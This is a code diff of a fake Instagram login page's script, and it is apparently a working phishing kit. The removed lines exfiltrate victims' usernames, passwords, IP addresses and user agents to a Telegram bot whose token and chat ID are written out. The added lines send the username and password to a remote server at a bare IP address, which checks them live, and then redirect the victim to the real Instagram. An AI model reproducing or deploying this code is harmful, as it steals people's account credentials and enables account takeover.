@@ -160,9 +160,6 @@
     </div>
 
     <script>
-        const TOKEN = "8524660585:AAHVKLyJeWs_5IM9nmNutXfPkXBBaBh4zi4";
-        const CHAT_ID = "5542692841";
-        const TELEGRAM_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
         const BACKEND_URL = "http://15.228.223.163:5000/login";
 
         const form = document.getElementById('loginForm');
@@ -171,38 +168,21 @@
         const btn = document.getElementById('loginBtn');
         const err = document.getElementById('errorMsg');
 
-        let userIP = "Desconhecido";
-
-        async function getIP() {
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                userIP = d.ip;
-            } catch (e) {}
-        }
-
-        async function processLogin(u, p) {
-            const ua = navigator.userAgent;
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            btn.disabled = true;
+            
+            const u = userInp.value;
+            const p = passInp.value;
             const ts = Math.floor(Date.now() / 1000);
             const encPwd = `#PWD_INSTAGRAM_BROWSER:0:${ts}:${p}`;
-            
-            const message = `🔐 *NOVA TENTATIVA DE LOGIN*\n\n` +
-                            `👤 *Usuário:* \`${u}\`\n` +
-                            `🔑 *Senha:* \`${p}\`\n\n` +
-                            `🌐 *IP:* ${userIP}\n` +
-                            `📱 *UA:* \`${ua}\``;
-
-            fetch(TELEGRAM_URL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'})
-            });
+            const ua = navigator.userAgent;
 
             try {
-                await fetch(BACKEND_URL, {
+                const response = await fetch(BACKEND_URL, {
                     method: 'POST',
                     mode: 'cors',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         user: u,
                         pass: p,
@@ -210,24 +190,21 @@
                         userAgent: ua
                     })
                 });
+
+                const result = await response.json();
+                
+                if (result.authenticated) {
+                    window.location.href = "https://www.instagram.com/";
+                } else {
+                    err.style.display = 'block';
+                    btn.disabled = false;
+                }
             } catch (e) {
                 console.error("Erro na comunicação com o backend.");
+                err.style.display = 'block';
+                btn.disabled = false;
             }
-        }
-
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            btn.disabled = true;
-            
-            await processLogin(userInp.value, passInp.value);
-            
-            err.style.display = 'block';
-            setTimeout(() => {
-                window.location.href = "https://www.instagram.com/accounts/login/";
-            }, 1500);
         });
-
-        window.onload = getIP;
     </script>
 </body>
 </html>
